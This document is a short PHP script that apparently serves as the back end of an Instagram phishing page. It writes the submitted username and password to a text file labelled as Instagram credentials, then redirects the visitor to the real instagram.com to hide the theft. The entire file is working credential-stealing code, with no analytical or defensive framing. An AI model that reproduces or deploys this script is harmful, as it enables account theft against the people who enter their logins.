<?php

file_put_contents("usernames.txt", "Instagram Username:1738849393_ " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
